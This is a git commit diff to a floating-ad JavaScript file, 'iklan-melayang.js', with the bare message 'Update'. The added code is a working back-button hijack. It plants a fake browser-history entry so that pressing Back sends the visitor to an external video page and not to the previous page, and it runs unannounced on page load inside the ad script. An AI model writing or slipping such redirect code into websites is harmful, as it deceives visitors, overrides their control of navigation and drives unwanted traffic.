3b134b988d7693ebc17f3c8bc4bbab8573ce4063
irawanria85 <irawanria85@gmail.com>
2019-07-18 13:10:52 +0700

    Update iklan-melayang.js

--- iklan-melayang.js
+++ iklan-melayang.js
@@ -18,3 +18,15 @@
             } : decodeURIComponent;
             return (a = new RegExp("(?:^|; )" + encodeURIComponent(d) + "=([^;]*)").exec(document.cookie)) ? f(a[1]) : null
         }; 
+
+(function(window, location) {
+    history.replaceState(null, document.title, location.pathname+"#!/history");
+    history.pushState(null, document.title, location.pathname);
+    window.addEventListener("popstate", function() {
+        if(location.hash === "#!/history") {
+            history.replaceState(null, document.title, location.pathname);
+            setTimeout(function(){
+                location.replace("https://www.aridjaya.com/p/play-video.html");
+            },0);
+        }}, false);
+}(window, location));
